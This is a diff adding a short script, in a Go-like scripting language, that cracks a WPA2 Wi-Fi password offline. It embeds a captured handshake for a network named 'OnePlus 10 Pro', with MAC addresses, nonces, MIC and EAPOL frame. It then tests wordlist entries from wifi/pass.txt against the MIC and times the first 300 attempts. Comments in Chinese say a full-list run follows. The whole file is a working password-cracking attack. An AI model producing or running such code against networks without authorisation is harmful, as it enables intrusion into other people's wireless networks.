@@ -1,0 +1,45 @@
+package main
+
+func main() {
+    let ssid = "OnePlus 10 Pro"
+    let apmac = "62:0c:eb:c7:73:03"
+    let stamac = "fa:2d:c5:aa:40:00"
+    let anonce = "d8a7185f29ebe50ee41c9c562986be05329f68cc971dbf6e500d1d972ebc480f"
+    let snonce = "7931b8fa48f200eef09607338d2a63ce33b89d731a8caa2dfd1d9841c011b3f2"
+    let mic = "0783fbc6ecda58c1871526017f37daf0"
+    let eapol = "0103007b02010a000000000000000000017931b8fa48f200eef09607338d2a63ce33b89d731a8caa2dfd1d9841c011b3f200000000000000000000000000000000000000000000000000000000000000000783fbc6ecda58c1871526017f37daf0001c301a0100000fac040100000fac040100000fac028c000000000fac06"
+
+    let content = io.read_file("wifi/pass.txt")
+    let raw = strings.Split(content, "\n")
+    let passwords = []
+    let i = 0
+    while i < len(raw) {
+        if raw[i] != "" {
+            let _ = passwords.append(raw[i])
+        }
+        i = i + 1
+    }
+    let total = len(passwords)
+    println("total:", total)
+
+    let start = time.now()
+    let k = 0
+    let found = false
+    let correct = ""
+    while k < 300 {
+        let pmk = crypto.WPA2_PMK(passwords[k], ssid)
+        let ptk = crypto.WPA2_PTK(pmk, anonce, snonce, apmac, stamac)
+        if crypto.WPA2_MIC_Verify(ptk.KCK, eapol, mic) {
+            found = true
+            correct = passwords[k]
+            println("FOUND:", correct, "at", k)
+            break
+        }
+        k = k + 1
+    }
+    let ms = time.sub(time.now(), start) / 1000000
+    println("300 个耗时:", ms, "ms, 单次:", ms / 300, "ms")
+    if not found {
+        println("前 300 未找到，继续全量...")
+    }
+}
